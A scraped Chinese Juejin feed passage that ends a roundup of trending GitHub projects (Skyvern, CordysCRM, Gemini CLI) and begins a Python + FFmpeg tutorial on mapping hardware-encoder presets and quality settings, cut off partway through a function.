<p><strong>🤖 用 <code>AI</code> + 计算机视觉自动化任意网页工作流</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45be8547b2d5454da7a3cd44fcdcd8b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765513134&amp;x-signature=nyDEEmiOZZREwjAej9CHlhEsSmo%3D" alt="skyvern_2_0_system_diagram.png" loading="lazy"/></p>
<p><strong><code>Skyvern</code></strong> 用大模型 + 视觉理解自动完成浏览器任务，无需写 <code>XPath</code>，页面改版也不崩。</p>
<ul>
<li><strong>无需硬编码选择器</strong>：通过视觉 + <code>LLM</code> 理解页面布局</li>
<li><strong>通用网页兼容</strong>：对未见过的网站也能直接操作</li>
<li><strong>支持复杂流程</strong>：登录、填表、下载、批量操作全覆盖</li>
<li><strong>多部署方式</strong>：本地 / <code>Docker</code> / 云端 <code>API</code> 任选</li>
</ul>
<p>💡 <strong><code>Skyvern</code></strong> 适合需要自动化发票下载、表单提交、批量操作、跨站数据抓取的财务、运营、开发者。</p>
<p>👉 <strong>立即探索</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSkyvern-AI%2Fskyvern" target="_blank" title="https://github.com/Skyvern-AI/skyvern" ref="nofollow noopener noreferrer"><code>GitHub</code></a></p>
</li>
<li>
<h3 data-id="heading-8"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F1Panel-dev%2FCordysCRM" target="_blank" title="https://github.com/1Panel-dev/CordysCRM" ref="nofollow noopener noreferrer"><code>CordysCRM</code></a></h3>
<p>🌟 <strong><code>Star</code> 数：<code>1.3K+</code></strong></p>
<p><strong>💼 一款开源 <code>AI</code> 驱动的私有化 <code>CRM</code> 系统</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bcc3daac8c1e4e65a0d4c73fac4319ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765513134&amp;x-signature=RwDyrYN8ZAsfuIgUbE0AapwC9I0%3D" alt="CordysCRM1.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8e801388aea544b6af099f0bdb6b9774~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765513134&amp;x-signature=TMXfblWWDk9Ev9Sh15P58COyBpk%3D" alt="CordysCRM2.png" loading="lazy"/></p>
<p><strong><code>CordysCRM</code></strong> 由 <code>1Panel</code> 团队打造，覆盖线索→商机→合同→回款全流程，内置 <code>AI</code> 线索评分与自然语言查询。</p>
<ul>
<li><strong>端到端销售流程</strong>：从线索获取到回款执行全覆盖</li>
<li><code>AI</code> + <code>BI</code> 加持：智能线索评分、自动跟进、自然语言查报表</li>
<li><strong>私有化部署</strong>：<code>Docker</code> 一键部署，所有数据自控</li>
<li><strong>企业协作集成</strong>：支持企业微信、钉钉、飞书</li>
</ul>
<p>💡 <strong><code>CordysCRM</code></strong> 适合重视数据主权、想摆脱 <code>Salesforce</code> 高昂费用的中小企业与成长型团队。</p>
<p>👉 <strong>立即体验</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F1Panel-dev%2FCordysCRM" target="_blank" title="https://github.com/1Panel-dev/CordysCRM" ref="nofollow noopener noreferrer"><code>GitHub</code></a></p>
</li>
<li>
<h3 data-id="heading-9"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgoogle-gemini%2Fgemini-cli" target="_blank" title="https://github.com/google-gemini/gemini-cli" ref="nofollow noopener noreferrer"><code>Gemini CLI</code></a></h3>
<p>🌟 <strong><code>Star</code> 数：<code>85.8K+</code></strong></p>
<p><strong>⚙️ <code>Google</code> 官方开源的终端版 <code>Gemini 2.5 Pro</code></strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d91f4b884b24de8a4b3d10f189d8eb3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765513134&amp;x-signature=fgRM9p46ae4xgsiB5cm8%2B6IkWn0%3D" alt="gemini-screenshot.png" loading="lazy"/></p>
<p><code>Gemini CLI</code> 把 <code>Gemini</code> 完整能力带入命令行，支持代码生成、调试、网页搜索、<code>shell</code> 执行，<code>1M</code> 上下文窗口。</p>
<ul>
<li><strong>终端优先</strong>：直接在命令行与 <code>Gemini</code> 对话</li>
<li><strong>多功能工具</strong>：<code>Google Search grounding</code>、文件操作、<code>shell</code> 命令</li>
<li><strong>超长上下文</strong>：<strong>1 百万 <code>token</code></strong>，适合大型代码库分析</li>
<li><strong>可脚本化</strong>：支持非交互模式，完美嵌入 <code>CI/CD</code></li>
</ul>
<p>💡 <strong><code>Gemini CLI</code></strong> 适合终端重度用户、后端开发者、自动化脚本爱好者，以及想把 <code>AI</code> 能力融入工作流的工程师。</p>
<p>👉 <strong>立即体验</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgoogle-gemini%2Fgemini-cli" target="_blank" title="https://github.com/google-gemini/gemini-cli" ref="nofollow noopener noreferrer"><code>GitHub</code></a></p>
</li>
</ol>
<h3 data-id="heading-10">结论</h3>
<p>2025 年 11 月的榜单，清晰勾勒出开源世界的三大新主旋律：</p>
<ul>
<li><strong><code>Agent</code> 可训练化</strong>：从静态脚本到自我进化的智能体</li>
<li><strong><code>AI</code> 原生自动化</strong>：渗透测试、浏览器操作、舆情分析全面被大模型+视觉重塑</li>
<li><strong>隐私与本地优先</strong>：从 <code>API</code> 客户端到 <code>CRM</code>，数据主权正在强势回归</li>
</ul>
<p>这十个项目不再是炫技玩具，而是真正能落地的生产力武器。未来已来，只是分布在这些 <code>GitHub</code> 仓库里。</p>
<p>📌 喜欢哪个就去点个 <code>Star</code>，每一个 <code>Star</code> 都是对开源最好的鼓励！ 📬</p>
<p>欢迎收藏、转发，也欢迎在评论区安利你心中的 12 月黑马～</p>
<hr/>
<h3 data-id="heading-11">往期推荐</h3>
<p>喜欢本期的热门项目？以下是一些值得一读的往期精彩内容：</p>
<ol>
<li><a href="https://juejin.cn/post/7434159897197133836" target="_blank" title="https://juejin.cn/post/7434159897197133836">🚀 2024年11月 GitHub 十大热门项目排行榜 🔥</a></li>
<li><a href="https://juejin.cn/post/7434159897197133836" target="_blank" title="https://juejin.cn/post/7434159897197133836">🚀 2024年12月 GitHub 十大热门项目排行榜 🔥</a></li>
<li><a href="https://juejin.cn/post/7461822837532213267" target="_blank" title="https://juejin.cn/post/7461822837532213267">🚀 2025年01月 GitHub 十大热门项目排行榜 🔥</a></li>
<li><a href="https://juejin.cn/post/7475237484085346355" target="_blank" title="https://juejin.cn/post/7475237484085346355">🚀 2025年02月 GitHub 十大热门项目排行榜 🔥</a></li>
<li><a href="https://juejin.cn/post/7486316823253565474" target="_blank" title="https://juejin.cn/post/7486316823253565474">🚀 2025年03月 GitHub 十大热门项目排行榜 🔥</a></li>
<li><a href="https://juejin.cn/post/7503762078386700298" target="_blank" title="https://juejin.cn/post/7503762078386700298">🚀 2025年04月 GitHub 十大热门项目排行榜 🔥</a></li>
<li><a href="https://juejin.cn/post/7508914438659735589" target="_blank" title="https://juejin.cn/post/7508914438659735589">🚀 2025年05月 GitHub 十大热门项目排行榜 🔥</a></li>
<li><a href="https://juejin.cn/post/7525688196605722670" target="_blank" title="https://juejin.cn/post/7525688196605722670">🚀 2025年06月 GitHub 十大热门项目排行榜 🔥</a></li>
<li><a href="https://juejin.cn/post/7533169614206861339" target="_blank" title="https://juejin.cn/post/7533169614206861339">🚀 2025年07月 GitHub 十大热门项目排行榜 🔥</a></li>
<li><a href="https://juejin.cn/post/7543830033606246419" target="_blank" title="https://juejin.cn/post/7543830033606246419">🚀 2025年08月 GitHub 十大热门项目排行榜 🔥</a></li>
<li><a href="https://juejin.cn/post/7555056825693634601" target="_blank" title="https://juejin.cn/post/7555056825693634601">🚀 2025年09月 GitHub 十大热门项目排行榜 🔥</a></li>
<li><a href="https://juejin.cn/post/7567208390368198696" target="_blank" title="https://juejin.cn/post/7567208390368198696">🚀 2025年10月 GitHub 十大热门项目排行榜 🔥</a></li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Python + FFmpeg 视频自动化处理指南：从硬件加速到精确剪辑]]></title>    <link>https://juejin.cn/post/7579849892614389796</link>    <guid>https://juejin.cn/post/7579849892614389796</guid>    <pubDate>2025-12-05T04:43:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579849892614389796" data-draft-id="7579893536106217478" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Python + FFmpeg 视频自动化处理指南：从硬件加速到精确剪辑"/> <meta itemprop="keywords" content="FFmpeg,Python,音视频开发"/> <meta itemprop="datePublished" content="2025-12-05T04:43:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="mortimer"/> <meta itemprop="url" content="https://juejin.cn/user/4441682704623992"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Python + FFmpeg 视频自动化处理指南：从硬件加速到精确剪辑
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4441682704623992/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    mortimer
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T04:43:42.000Z" title="Fri Dec 05 2025 04:43:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.7;font-weight:400;font-size:16px;overflow-x:hidden;color:#212122}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:8px;padding-bottom:8px}.markdown-body h1{color:#a0a0a0;font-size:38px;margin-top:32px;padding-top:32px}.markdown-body h2{color:#fff;background-color:#212122;width:fit-content;border-bottom-right-radius:100px;margin-top:47px;margin-bottom:16px;padding:4px 48px 4px 8px;line-height:1.7;font-size:30px;transition:all .3s ease-out}.markdown-body h2:hover{border-bottom-right-radius:50px;transition:all .3s ease-out}.markdown-body h3{font-size:24px;padding-left:8px;margin-top:32px;border-bottom:2px solid #c6c4c4;line-height:1.7}.markdown-body h4{font-size:20px;padding-left:8px;margin-top:32px;border-bottom:1px solid #ddd}.markdown-body h5{font-size:16px;margin-top:24px}.markdown-body h6{margin-top:16px;line-height:1.1}.markdown-body p{font-size:16px;text-align:start;white-space:normal;text-size-adjust:auto;line-height:2;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%;margin:auto;padding-left:8px;padding-right:8px}.markdown-body hr{border:none;border-top:4px double #212122;margin-top:32px;margin-bottom:32px;text-align:center}.markdown-body hr:after{content:"♥";display:inline-block;position:relative;top:-15px;padding:0 10px;color:#212122;font-size:18px}.markdown-body code{word-break:break-word;overflow-x:auto;background-color:#f1f1f1;color:#ef7060;font-size:14px;padding:.065em 6px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.7;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);margin:32px 16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-color:#212122;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);background-size:40px}.markdown-body pre&gt;code{font-size:14px;padding:16px 8px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#fff;background:#272822}.markdown-body pre&gt;code::-webkit-scrollbar{height:10px;background-color:#f5f5f5}.markdown-body pre&gt;code::-webkit-scrollbar-track{box-shadow:inset 0 0 6px rgba(0,0,0,.3);border-radius:3px;background-color:#f5f5f5}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{border-radius:3px;box-shadow:inset 0 0 6px rgba(0,0,0,.3);background-color:#555}.markdown-body a{color:#ef7060;padding:2px;text-decoration:none;border-bottom:.125em solid #ef7060;border-radius:2px;box-shadow:inset 0 -.025em 0 #ef7060;transition:box-shadow .27s cubic-bezier(.77,0,.175,1),color .27s cubic-bezier(.77,0,.175,1)}.markdown-body a:focus,.markdown-body a:hover{outline:none;box-shadow:inset 0 -1.5em 0 #ef7060;color:#fff}.markdown-body a:before{content:"⇲ ";vertical-align:top;margin-left:2px;font-family:dart!important;font-size:12px;color:inherit;opacity:.7}.markdown-body table{background:#fbfbfb;border-radius:4px;border-collapse:collapse;margin:auto;padding:5px;width:95%;box-shadow:0 5px 10px rgba(0,0,0,.1);animation:float 5s infinite}.markdown-body table th{color:#fff;background:#212122;border-bottom:1px solid #9ea7af;border-right:1px solid #343a45;font-size:18px;padding:16px;text-align:left;vertical-align:middle}.markdown-body table th:first-child{border-top-left-radius:4px}.markdown-body table th:last-child{border-top-right-radius:4px;border-right:none}.markdown-body table tr{border-top:1px solid #c1c3d1;border-bottom:1px solid #c1c3d1;color:#666b85}.markdown-body table tr:hover td{background:#212122;color:#fff;border-top:1px solid #22262e}.markdown-body table tr:first-child{border-top:none}.markdown-body table tr:last-child{border-bottom:none}.markdown-body table tr:nth-child(odd) td{background:#f1f1f1}.markdown-body table tr:nth-child(odd):hover td{background:#212122}.markdown-body table tr:last-child td:first-child{border-bottom-left-radius:4px}.markdown-body table tr:last-child td:last-child{border-bottom-right-radius:4px}.markdown-body table td{background:#fbfbfb;padding:16px;text-align:left;vertical-align:middle;font-size:16px;border-right:1px solid #c1c3d1}.markdown-body table td:last-child{border-right:0}.markdown-body blockquote{color:#777;padding:1px 16px;margin:24px 0;border-left:4px solid #c6c4c4;background-color:#f1f1f1;transition:all .3s ease-out;border-radius:4px}.markdown-body blockquote:hover{border-left-color:#212122;background-color:#212122;color:#fff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:24px}.markdown-body ol li,.markdown-body ul li{margin-bottom:6px;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body span.math{margin-left:32px;font-size:18px;font-weight:700}@media (max-width:720px){.markdown-body h1{font-size:30.4px}.markdown-body h2{font-size:24px}.markdown-body h3{font-size:19.2px}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:12.8px}}</style><style data-highlight="" data-highlight-key="monokai">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#272822;color:#ddd}.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-strong,.hljs-tag{color:#f92672}.hljs-code{color:#66d9ef}.hljs-class .hljs-title{color:#fff}.hljs-attribute,.hljs-link,.hljs-regexp,.hljs-symbol{color:#bf79db}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-emphasis,.hljs-section,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string,.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-title,.hljs-type,.hljs-variable{color:#a6e22e}.hljs-comment,.hljs-deletion,.hljs-meta,.hljs-quote{color:#75715e}.hljs-doctag,.hljs-keyword,.hljs-literal,.hljs-section,.hljs-selector-id,.hljs-selector-tag,.hljs-title,.hljs-type{font-weight:700}</style><p>在 Python 中调用 <code>subprocess.run</code> 执行 FFmpeg 命令是视频自动化处理的常见方案。然而，面对 Windows/Linux/macOS 的跨平台兼容性、NVIDIA/Intel/AMD/Apple 的硬件加速差异，以及“拼接黑帧”、“音画不同步”等经典坑点，写出一套健壮的代码并不容易。</p>
<p>本文将总结一套完整的解决方案，涵盖硬件编码参数映射、精确变速剪辑、以及多流合并的终极逻辑。</p>
<hr/>
<h2 data-id="heading-0">一、 跨平台硬件加速：统一接口设计</h2>
<p>不同硬件编码器 NVENC, QSV, VAAPI, VideoToolbox 对参数的要求各不相同。我们需要一个中间层，将通用的“画质 CRF ”和“速度 Preset ”映射到底层参数。</p>
<h3 data-id="heading-1">1. 核心映射逻辑</h3>
<ul>
<li><strong>Preset（预设）</strong>：x264 使用 <code>fast/medium/slow</code>，但 NVENC 使用 <code>p1-p7</code>，VideoToolbox 不支持 preset。</li>
<li><strong>Quality（画质）</strong>：x264/x265 使用 <code>-crf</code>，但硬件编码器通常使用 <code>-cq</code> (NVENC), <code>-global_quality</code> (QSV), 或 <code>-q:v</code> (Apple)。</li>
</ul>
<h3 data-id="heading-2">2. Python 实现代码</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Tuple</span>, <span class="hljs-type">List</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">_translate_crf_to_hw_quality</span>(<span class="hljs-params">crf_value: <span class="hljs-built_in">str</span>, encoder_family: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-string">"""
    将 CRF (0-51) 转换为不同硬件的质量参数。
    """</span>
    <span class="hljs-keyword">try</span>:
        crf = <span class="hljs-built_in">float</span>(crf_value)
        <span class="hljs-comment"># NVENC/QSV/VAAPI: 范围 ~1-51，越小质量越高，逻辑与 CRF 类似</span>
        <span class="hljs-keyword">if</span> encoder_family <span class="hljs-keyword">in</span> [<span class="hljs-string">'nvenc'</span>, <span class="hljs-string">'qsv'</span>, <span class="hljs-string">'vaapi'</span>]:
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(<span class="hljs-built_in">max</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">min</span>(crf, <span class="hljs-number">51</span>)))
        
        <span class="hljs-comment"># VideoToolbox (Mac): 范围 1-100，越大质量越高。需要反向映射。</span>
        <span class="hljs-comment"># 经验公式: Quality = 100 - (CRF * 1.8)</span>
        <span class="hljs-keyword">if</span> encoder_family == <span class="hljs-string">'videotoolbox'</span>:
            quality = <span class="hljs-number">100</span> - (crf * <span class="hljs-number">1.8</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(<span class="hljs-built_in">max</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">min</span>(quality, <span class="hljs-number">100</span>)))
            
    <span class="hljs-keyword">except</span> (ValueError, TypeError):
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">_build_hw_command</span>(<span class="hljs-params">args: <span class="hljs-built_in">list</span>, hw_codec: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">Tuple</span>[<span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>], <span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>]]:
    <span class="hljs-string">"""
    构建硬件编码参数。
    返回: (新参数列表, 硬件解码参数列表)
    """</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> hw_codec <span class="hljs-keyword">or</span> <span class="hljs-string">'libx'</span> <span class="hljs-keyword">in</span> hw_codec <span class="hljs-keyword">or</span> hw_codec == <span class="hljs-string">'copy'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>(args), []

    encoder_family = hw_codec.split(<span class="hljs-string">'_'</span>)[-<span class="hljs-number">1</span>].lower() <span class="hljs-comment"># 提取 nvenc, qsv 等</span>
    
    <span class="hljs-comment"># 1. Preset 映射表</span>
    PRESET_MAP = {
        <span class="hljs-string">'nvenc'</span>: {<span class="hljs-string">'fast'</span>: <span class="hljs-string">'p2'</span>, <span class="hljs-string">'medium'</span>: <span class="hljs-string">'p4'</span>, <span class="hljs-string">'slow'</span>: <span class="hljs-string">'p7'</span>}, <span class="hljs-comment"># p1-p7</span>
        <span class="hljs-string">'qsv'</span>: {<span class="hljs-string">'fast'</span>: <span class="hljs-string">'faster'</span>, <span class="hljs-string">'medium'</span>: <span class="hljs-string">'medium'</span>, <span class="hljs-string">'slow'</span>: <span class="hljs-string">'slower'</span>},
        <span class="hljs-string">'amf'</span>: {<span class="hljs-string">'fast'</span>: <span class="hljs-string">'speed'</span>, <span class="hljs-string">'medium'</span>: <span class="hljs-string">'balanced'</span>, <span class="hljs-string">'slow'</span>: <span class="hljs-string">'quality'</span>},
        <span class="hljs-string">'videotoolbox'</span>: <span class="hljs-literal">None</span> <span class="hljs-comment"># Apple 硬编不支持 -preset</span>
    }
    
    <span class="hljs-comment"># 2. 质量参数名映射表</span>
    QUALITY_PARAM_MAP = {
        <span class="hljs-string">'nvenc'</span>: <span class="hljs-string">'-cq'</span>,
        <span class="hljs-string">'qsv'</span>: <span class="hljs-string">'-global_quality'</span>,
        <span class="hljs-string">'videotoolbox'</span>: <span class="hljs-string">'-q:v'</span>,
    }

    new_args = []
